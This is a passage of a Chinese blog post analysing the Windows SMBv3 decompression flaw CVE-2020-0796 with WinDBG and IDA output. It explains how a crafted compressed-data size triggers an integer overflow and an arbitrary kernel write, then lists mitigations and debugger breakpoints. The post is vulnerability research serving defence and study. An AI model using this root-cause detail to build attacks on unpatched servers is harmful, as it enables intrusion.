c:\symbol\ntkrnlmp.pdb\CE7FFB00C20B87500211456B3E905C471\ntkrnlmp.pdb</span><br><span class="line">..</span><br><span class="line"></span><br><span class="line">kd&gt; kn</span><br><span class="line"># Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffff904&#96;bd3a1f28 fffff806&#96;1cea92a2 nt!DbgBreakPointWithStatus</span><br><span class="line">01 fffff904&#96;bd3a1f30 fffff806&#96;1cea8992 nt!KiBugCheckDebugBreak+0x12</span><br><span class="line">02 fffff904&#96;bd3a1f90 fffff806&#96;1cdc11a7 nt!KeBugCheck2+0x952</span><br><span class="line">03 fffff904&#96;bd3a2690 fffff806&#96;1cdd2ee9 nt!KeBugCheckEx+0x107</span><br><span class="line">04 fffff904&#96;bd3a26d0 fffff806&#96;1cdd3310 nt!KiBugCheckDispatch+0x69</span><br><span class="line">05 fffff904&#96;bd3a2810 fffff806&#96;1cdd16a5 nt!KiFastFailDispatch+0xd0</span><br><span class="line">06 fffff904&#96;bd3a29f0 fffff806&#96;1cdfa745 nt!KiRaiseSecurityCheckFailure+0x325</span><br><span class="line">07 fffff904&#96;bd3a2b88 fffff806&#96;1cc44380 nt!RtlRbRemoveNode+0x1b6145</span><br><span class="line">08 fffff904&#96;bd3a2ba0 fffff806&#96;1cc43e3a nt!RtlpHpVsChunkCoalesce+0xb0</span><br><span class="line">09 fffff904&#96;bd3a2c10 fffff806&#96;1cc460ad nt!RtlpHpVsContextFree+0x18a</span><br><span class="line">0a fffff904&#96;bd3a2cb0 fffff806&#96;1cf6e0a9 nt!ExFreeHeapPool+0x56d</span><br><span class="line">0b fffff904&#96;bd3a2dd0 fffff806&#96;1b97e5ae nt!ExFreePool+0x9</span><br><span class="line">0c fffff904&#96;bd3a2e00 fffff806&#96;1b9d7f41 srvnet!SmbCompressionDecompress+0xfe</span><br><span class="line">0d fffff904&#96;bd3a2e70 fffff806&#96;1b9d699e srv2!Srv2DecompressData+0xe1</span><br><span class="line">0e fffff904&#96;bd3a2ed0 fffff806&#96;1ba19a9f srv2!Srv2DecompressMessageAsync+0x1e</span><br><span class="line">0f fffff904&#96;bd3a2f00 fffff806&#96;1cdc496e srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f</span><br><span class="line">10 fffff904&#96;bd3a2f80 fffff806&#96;1cdc492c nt!KxSwitchKernelStackCallout+0x2e</span><br><span class="line">11 fffff904&#96;bd3478f0 fffff806&#96;1cc6a33e nt!KiSwitchKernelStackContinue</span><br><span class="line">12 fffff904&#96;bd347910 fffff806&#96;1cc6a13c nt!KiExpandKernelStackAndCalloutOnStackSegment+0x18e</span><br><span class="line">13 fffff904&#96;bd3479b0 fffff806&#96;1cc69fb3 nt!KiExpandKernelStackAndCalloutSwitchStack+0xdc</span><br><span class="line">14 fffff904&#96;bd347a20 fffff806&#96;1cc69f6d nt!KeExpandKernelStackAndCalloutInternal+0x33</span><br><span class="line">15 fffff904&#96;bd347a90 fffff806&#96;1ba197f7 nt!KeExpandKernelStackAndCalloutEx+0x1d</span><br><span class="line">16 fffff904&#96;bd347ad0 fffff806&#96;1d316917 srv2!RfspThreadPoolNodeWorkerRun+0x117</span><br><span class="line">17 fffff904&#96;bd347b30 fffff806&#96;1cd2a715 nt!IopThreadStart+0x37</span><br><span class="line">18 fffff904&#96;bd347b90 fffff806&#96;1cdc86ea nt!PspSystemThreadStartup+0x55</span><br><span class="line">19 fffff904&#96;bd347be0 00000000&#96;00000000 nt!KiStartSystemThread+0x2a</span><br></pre></td></tr></table></figure>
-
-<p>根据函数名称字面理解或参考DDK文档ExFreePool是释放内存的函数，一般不会有什么问题。这个涉及Windows内核的Pool内存管理机制及结构。过往经验告诉我们，ExFreePool需要操作的内存结构被破坏掉了，即这可能是个Windows内核中的内存破坏漏洞(Memory Corruption)。</p>
-<p>人生终极三问：你是谁？从哪里来？到哪里去？在漏洞分析领域同样适用。</p>
-<p>为搞明白ExFreePool要释放的内存，来自哪里，又是被谁搞坏的。我们需要在IDA Pro中看看srvnet模块中的SmbCompressionDecompress函数。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.png" alt="img"></p>
-<center>图 3</center>
-
-<p>当然如果你那边IDA Pro显示的和图3所示不同，没有这些可读性较好的变量名，而是像图4这样</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.png" alt="img"></p>
-<center>图 4</center>
-
-<p>也不必惊讶，后续我们会解释，如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。这个过程有点像Windows系统自带的扫雷游戏。</p>
-<p>IDA Pro显示srvnet模块中的SmbCompressionDecompress函数主要流程十分清晰：申请内存(ExAllocatePoolWithTag)、解压处理(RtlDecompressBufferEx2)、释放内存(ExFreePoolWithTag)。</p>
-<p>我们现在已知蓝屏的直接原因是释放内存的操作引起的，那么问题就显然出现在成功申请内存之后，到释放内存之间的这个过程中。我们看到这个过程中只有一个处理函数，即RtlDecompressBufferEx2。</p>
-<p>现在所有的疑点都集中在了RtlDecompressBufferEx2函数上，</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.png" alt="img"></p>
-<center>图 5</center>
-
-<p>我们来看看这个ntoskrnl模块中的RtlDecompressBufferEx2函数。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.png" alt="img"></p>
-<center>图 6</center>
-
-<p>在图6中IDA Pro显示RtlDecompressBufferEx2函数是根据参数CompressionFormat的一个跳转函数。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.png" alt="img"></p>
-<center>图 7</center>
-
-<p>RtlDecompressBufferProcs数组前2个QWORD元素为0。即当CompressionFormat取值为3时，函数最终转向RtlDecompressBufferXpressLz函数中。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.png" alt="img"></p>
-<center>图 8</center>
-
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.png" alt="img"></p>
-<center>图 9</center>
-
-<p>在图8和9中，IDA Pro显示RtlDecompressBufferXpressLz函数是一个300多行伪代码的复杂函数。</p>
-<p>静态分析有点困难，为了快速定位问题，让我们来试试用WinDBG动态调试一下。</p>
-<p>还是执行PoC，windbg中断时执行kn或者!analyze -v。这次我们试试!analyze -v。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FOLLOWUP_IP:</span><br><span class="line">nt!RtlDecompressBufferXpressLz+2d</span><br><span class="line">0fffff800&#96;4575e3c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]</span><br><span class="line"></span><br><span class="line">FAULT_INSTR_CODE:  c085a4f3</span><br><span class="line">SYMBOL_STACK_INDEX:  7</span><br><span class="line">SYMBOL_NAME:  nt!RtlDecompressBufferXpressLz+2d0</span><br><span class="line">FOLLOWUP_NAME:  MachineOwner</span><br><span class="line">MODULE_NAME: nt</span><br><span class="line">IMAGE_NAME:  ntkrnlmp.exe</span><br><span class="line">DEBUG_FLR_IMAGE_TIMESTAMP:  0</span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line">BUCKET_ID_FUNC_OFFSET:  2d0</span><br><span class="line">FAILURE_BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">BUCKET_ID:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br><span class="line">PRIMARY_PROBLEM_CLASS:  AV_INVALID_nt!RtlDecompressBufferXpressLz</span><br></pre></td></tr></table></figure>
-
-<p>太棒了，我们和WinDBG达成了共识。它直接提示可能是nt!RtlDecompressBufferXpressLz+2d0处出了问题。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.png" alt="img"></p>
-<center>图 10</center>
-
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.png" alt="img"></p>
-<center>图 11</center>
-
-<p>如图10和11所示，现在我们了解到nt!RtlDecompressBufferXpressLz+2d0处是一个内存复制函数qmemcpy。这符合往常的漏洞构成的元素。</p>
-<p>我们需要再了解一下qmemcpy里面的这3个参数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402f06b3000</span><br><span class="line">Pool page ffffe402f06b3000 region is Nonpaged pool</span><br><span class="line">*ffffe402f06b3000 : large page allocation, tag is LS2%, size is 0xef30 bytes</span><br><span class="line">Pooltag LS2% : LM server allocations</span><br><span class="line"></span><br><span class="line">kd&gt; !pool 0xffffe402f06b3000+0xef30</span><br><span class="line">Pool page ffffe402f06c1f30 region is Nonpaged pool</span><br><span class="line">*ffffe402f06c1f30 size:   b0 previous size:    0  (Free)      *...&amp;</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line">ffffe402f06c1fe0 size: 10020 previous size:    0  (Free)       ...&amp;</span><br></pre></td></tr></table></figure>
-
-<p>我们设置一个这样的断点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2D0 &quot;.printf \&quot;RtlDecompressBufferXpressLz(), qmemcpy(dst&#x3D;0x%I64x, src&#x3D;0x%I64x, count&#x3D;0x%I64x)\&quot;, rdi, rsi, r9;.echo&quot;</span><br></pre></td></tr></table></figure>
-
-<p>当WinDBG中断下来时，我们就能得到感兴趣的qmemcpy的3个参数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;00000000fffffffe rbx&#x3D;ffffe402e90a544f rcx&#x3D;000000008483ffff</span><br><span class="line">rdx&#x3D;ffffe40371234438 rsi&#x3D;ffffe402ec9f4438 rdi&#x3D;ffffe402ec9f4439</span><br><span class="line">rip&#x3D;fffff8015a75e3c0 rsp&#x3D;ffff890c4ed8ad98 rbp&#x3D;ffffe402ec9f4438</span><br><span class="line">r8&#x3D;ffffe402e90a5457  r9&#x3D;000000008483ffff r10&#x3D;ffffe40371234438</span><br><span class="line">r11&#x3D;ffffe402e90a5457 r12&#x3D;0000000000000000 r13&#x3D;ffffe402e373bd00</span><br><span class="line">r14&#x3D;ffffe402e90a5401 r15&#x3D;ffffe403ec9f4437</span><br><span class="line">iopl&#x3D;0         nv up ei ng nz na pe cy</span><br><span class="line">cs&#x3D;0010  ss&#x3D;0018  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00040283</span><br><span class="line">nt!RtlDecompressBufferXpressLz+0x2d0:</span><br><span class="line">fffff801&#96;5a75e3c0 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]</span><br></pre></td></tr></table></figure>
-
-<p>伪代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(dst&#x3D;0xffffe402ec9f4439, src&#x3D;0xffffe402ec9f4438, count&#x3D;0x8483ffff)</span><br></pre></td></tr></table></figure>
-
-<p>查看一下目的内存的pool信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402ec9f4439</span><br><span class="line">Pool page ffffe402ec9f4439 region is Nonpaged pool</span><br><span class="line">*ffffe402ec9f4000 : large page allocation, tag is LS00, size is 0x1280 bytes</span><br><span class="line">Pooltag LS00 : SRVNET LookasideList level 0 allocation 256 Bytes, Binary : srvnet.sys</span><br></pre></td></tr></table></figure>
-
-<p>这是一个0x1280大小的large page allocation非分页池内存。qmemcpy函数准备向其中写入<font color="red"><strong>0x8483FFFF</strong> </font>大小的数据。很显然会溢出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0xffffe402ec9f4000+0x1280</span><br><span class="line">Pool page ffffe402ec9f5280 region is Nonpaged pool</span><br><span class="line">*ffffe402ec9f5280 size:  700 previous size:    0  (Free)      *...&amp;</span><br><span class="line">Owning component : Unknown (update pooltag.txt)</span><br><span class="line">ffffe402ec9f5990 size:  290 previous size:    0  (Allocated)  MmCi</span><br><span class="line">ffffe402ec9f5c20 size:  3c0 previous size:    0  (Free)       ...&amp;</span><br></pre></td></tr></table></figure>
-
-<p>对于Pool内存的大小不超过一个页面长度(PAGE_SIZE，即4K字节)时，可以通过使用POOL_HEADER结构体来查看pool块信息。而对于large page allocation的内存却不行。</p>
-<p>我们注意到0xffffe402ec9f4000之后在ffffe402ec9f5280 处是一个0x700大小的空闲块，再之后ffffe402ec9f5990 处是一个0x290 大小的已被分配使用的块。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !poolval 0xffffe402ec9f4000+0x1280</span><br><span class="line">Pool page ffffe402ec9f5280 region is Nonpaged pool</span><br><span class="line">Validating Pool headers for pool page: ffffe402ec9f5280</span><br><span class="line">Pool page [ ffffe402ec9f5000 ] is INVALID.</span><br><span class="line">Analyzing linked list...</span><br><span class="line">[ ffffe402ec9f5000 ]: invalid previous size [ 0x41 ] should be [ 0x0 ]</span><br><span class="line">Scanning for single bit errors...</span><br><span class="line">None found</span><br></pre></td></tr></table></figure>
-
-<p>在qmemcpy函数执行后，我们发现ffffe402ec9f5280处的_POOL_HEADER确实被写入了数据。</p>
-<h3 id="3-2-复制数据的大小"><a href="#3-2-复制数据的大小" class="headerlink" title="3.2 复制数据的大小"></a>3.2 复制数据的大小</h3><p>现在我们需要搞明白，复制数据大小和目的地址的来源。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.png" alt="img"></p>
-<center>图 12</center>
-
-<p>经过类似的断点和调试，我们在nt!RtlDecompressBufferXpressLz+0x2AA处，观察到qmemcpy中的count数据来自于RtlDecompressBufferXpressLz收到的参数CompressedBuffer的最后4个字节与3之和（图12所示）。因此操作压缩数据末尾的4个字节，可以控制复制数据的大小。</p>
-<p>复制数据大小的来源已经清楚了，就剩下最后一个谜团–目的地址的来源。</p>
-<h3 id="3-3-目的地址的来源"><a href="#3-3-目的地址的来源" class="headerlink" title="3.3 目的地址的来源"></a>3.3 目的地址的来源</h3><p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.png" alt="img"></p>
-<center>图 13</center>
-
-<p>我们根据设置的WinDBG断点日志，整理了图13所示的函数调用及数据传递过程。也顺便介绍前文所述的如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。入手点是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2查阅到的关于RtlDecompressBufferEx2的定义或NT之前泄露的源码中的相关函数定义。</a></p>
-<p>从日志上来看，qmemcpy的目的地址正是UncompressedBuffer偏移1的地方。</p>
-<p>Srv2DecompressData+0x85处的ExAllocatePoolWithTag() 返回值是0xffffa28f92503000，位于UncompressedBuffer之后0x370CBC8的位置。</p>
-<p>即qmemcpy写入数据大小范围内有其他的Pool块时，将会导致ExFreePoolWithTag()时出错。</p>
-<h3 id="3-4-任意地址写入"><a href="#3-4-任意地址写入" class="headerlink" title="3.4 任意地址写入"></a>3.4 任意地址写入</h3><p>如果size大小合适或者其范围内没有在用的Pool块，如0x1100+0n24大小时，则会有下述情况：</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.png" alt="img"></p>
-<center>图 14</center>
-
-<p>我们根据相关函数调用，绘制了图14所示的内存布局图。</p>
-<p>当srv2!Srv2DecompressData+0x79处 SrvNetAllocateBuffer((unsigned int)(hdr.OriginalCompressedSegmentSize + offset)申请内存时，返回值设定AllocateBuf，简称A点。B点至U点正是SMB协议头中的offset值0x03e8(0n1000)。</p>
-<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.png" alt="img"></p>
-<center>图 15</center>
-
-<p>OriginalCompressedSegmentSize值（图15中Wireshark所示的OriginalSize）过大，与offset相加导致整数溢出。最终申请了一个较小的内存。即B点至A点的内存。内存的起始地址被写在AllocateBuf+0n24的P点。</p>
-<p>当解压函数把超量数据写入U点时，如果超过了之前申请的内存（B点至A点的内存），也会覆盖原本存放在P处的指针。</p>
-<p>srv2!Srv2DecompressData+0x108处的memmove会读取P点的指针作为目的地址，写入原始数据中offset之前的数据，从而完成预定的解压逻辑。当P处的指针可以被改写后，攻击者就获得了一次任意地址写入任意数据的能力。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffffcb0558c5f060, Dst&#x3D;0x4141414141414141, Size&#x3D;1000)</span><br><span class="line"></span><br><span class="line">kd&gt; db 0x0xffffcb0558c5f060</span><br><span class="line">ffffcb05&#96;58c5f060  03 03 03 03 03 03 00 00-00 00 00 00 00 00 ff ff  ................</span><br><span class="line">ffffcb05&#96;58c5f070  ff fe 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">ffffcb05&#96;58c5f0d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line"></span><br><span class="line">kd&gt; !pool 0x0xffffcb0558c5f060</span><br><span class="line">Pool page ffffcb0558c5f060 region is Nonpaged pool</span><br><span class="line">*ffffcb0558c5f000 : large page allocation, tag is LS00, size is 0x1280 bytes</span><br><span class="line">Pooltag LS00 : SRVNET LookasideList level 0 allocation 256 Bytes, Binary : srvnet.sys</span><br></pre></td></tr></table></figure>
-
-<p>至此漏洞分析视角下的工作基本完成，撰写分析报告时，我们会用倒叙的方法，就是大家经常看到的文章形式。后续文章我们再谈谈漏洞补丁分析和漏洞利用。</p>
-<h2 id="4-解决方案"><a href="#4-解决方案" class="headerlink" title="4 解决方案"></a>4 解决方案</h2><p>尽快安装微软官方补丁或在网络出入口上阻止TCP端口445，以防止SMB流量进出互联网。此外，我们建议您进行内部网络分段，并禁止终端之间的SMB连接，以防止横向移动。</p>
-<p>禁用SMBv3压缩将防止利用易受攻击的SMB服务器。要禁用SMBv3压缩，可以在PowerShell中运行以下命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path  </span><br><span class="line"> &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot;</span><br><span class="line"> DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-综述"><a href="#5-综述" class="headerlink" title="5 综述"></a>5 综述</h2><p>此漏洞对攻击者具有很高的价值，可使得攻击者很容易触及分配内存的函数，并且可以控制触发溢出的数据大小。蓝屏(BSOD)一般是远程代码执行的前兆，从其进化到远程代码执行(RCE)会更具挑战性，因为需要借助其他漏洞以便绕过Windows最新的缓解技术(KASLR)。应警惕漏洞利用难度稍小的本地权限提升情景，请尽快安装官方补丁。</p>
-<h2 id="6-参考和引用"><a href="#6-参考和引用" class="headerlink" title="6 参考和引用"></a>6 参考和引用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-smb2&#x2F;1d435f21-9a21-4f4c-828e-624a176cf2a0</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-smb2&#x2F;5606ad47-5ee0-437a-817e-70c366052962</span><br><span class="line">http:&#x2F;&#x2F;yiiyee.cn&#x2F;blog&#x2F;2013&#x2F;12&#x2F;11&#x2F;large-pool-1&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-hardware&#x2F;drivers&#x2F;ddi&#x2F;ntifs&#x2F;nf-ntifs-rtlgetcompressionworkspacesize</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows-hardware&#x2F;drivers&#x2F;ddi&#x2F;ntifs&#x2F;nf-ntifs-rtldecompressbufferex2</span><br></pre></td></tr></table></figure>
-
-<h2 id="7-命令和断点"><a href="#7-命令和断点" class="headerlink" title="7 命令和断点"></a>7 命令和断点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sxe ld srv2</span><br><span class="line">!pool</span><br><span class="line">!poolval</span><br><span class="line">dt nt!_POOL_HEADER</span><br><span class="line">.writemem c:\test.log 0x20000000 L1000</span><br><span class="line">bp nt!RtlDecompressBufferEx2 &quot;.printf \&quot;RtlDecompressBufferEx2(CompressionFormat&#x3D;%d, UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;0x%I64x, UncompressedChunkSize&#x3D;0x%I64x, FinalUncompressedSize&#x3D;0x%I64x, WorkSpace&#x3D;%d)\&quot;, cl, rdx, r8d, r9, poi(rsp+0x70), poi(rsp+0x78), poi(rsp+0x80), poi(rsp+0x88);.echo;g&quot;</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2D0 &quot;.printf \&quot;RtlDecompressBufferXpressLz (), qmemcpy(dst&#x3D;0x%I64x, src&#x3D;0x%I64x, count&#x3D;0x%I64x)\&quot;, rdi, rsi, r9;.echo&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress &quot;.printf \&quot;srvnet!SmbCompressionDecompress(CompressionFormat&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;%d, UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;0x%I64x\&quot;, ecx, rdx, r8d, r9, poi(rsp+0x90);.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0x85 &quot;.printf \&quot;ExAllocatePoolWithTag(POOL_TYPE&#x3D;512, NumberOfBytes&#x3D;%d(0x%I64x), Tag&#x3D;2SL)\&quot;, edx, edx;.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0x91 &quot;.printf \&quot;ExAllocatePoolWithTag() return 0x%I64x\&quot;, rax;.echo;g&quot;</span><br><span class="line">bp srvnet!SmbCompressionDecompress+0xDF &quot;.printf \&quot;RtlDecompressBufferEx2() return0x%I64x,  FinalUncompressedSize&#x3D;%d(0x%I64x)\&quot;, ebx, poi(rsp+0x98), poi(rsp+0x98);.echo;g&quot;</span><br><span class="line">bp srvnet !SmbCompressionDecompress+0xF2 &quot;.printf \&quot;ExFreePoolWithTag(WorkSpace&#x3D;%d(0x%I64x))\&quot;, rcx, rcx;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData &quot;.printf \&quot;srv2!Srv2DecompressData(buf&#x3D;0x%I64x)\n\&quot;, rcx;db rcx L200;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x79 &quot;.printf \&quot;srv2!SrvNetAllocateBuffer(Size&#x3D;%d, Unknown&#x3D;%d) \n\&quot;, rcx, rdx;db esp+0x30 LF;dd esp+0x30 L4;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x85 &quot;.printf \&quot;srv2!SrvNetAllocateBuffer() &#x3D;0x%I64x \n\&quot;, rax;db rax;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0xEC &quot;.printf \&quot;FinalUncompressedSize&#x3D;0x%I64x, Size.m128i_i32[1]&#x3D;0x%I64x\&quot;, eax, r14d;.echo;g&quot;</span><br><span class="line">bp srv2!Srv2DecompressData+0x108 &quot;.printf \&quot;srv2!memmove(Src&#x3D;0x%I64x, Dst&#x3D;0x%I64x,Size&#x3D;%d) \n\&quot;, rdx, rcx, r8d;db rdx;.echo&quot;</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz &quot;.printf \&quot; nt!RtlDecompressBufferXpressLz(UncompressedBuffer&#x3D;0x%I64x, UncompressedBufferSize&#x3D;%d, CompressedBuffer&#x3D;0x%I64x, CompressedBufferSize&#x3D;%d,0x%I64x,0x%I64x)\&quot;, rcx, edx, r8, r9d, rsp+0x38, poi(rsp+0x40);.echo;g&quot;</span><br><span class="line">bp srvnet!PplGenericAllocateFunction+0x35</span><br><span class="line">bp nt!RtlDecompressBufferXpressLz+0x2AA</span><br><span class="line">bp srvnet!SrvNetAllocateBuffer+0xD59F&quot;.printf 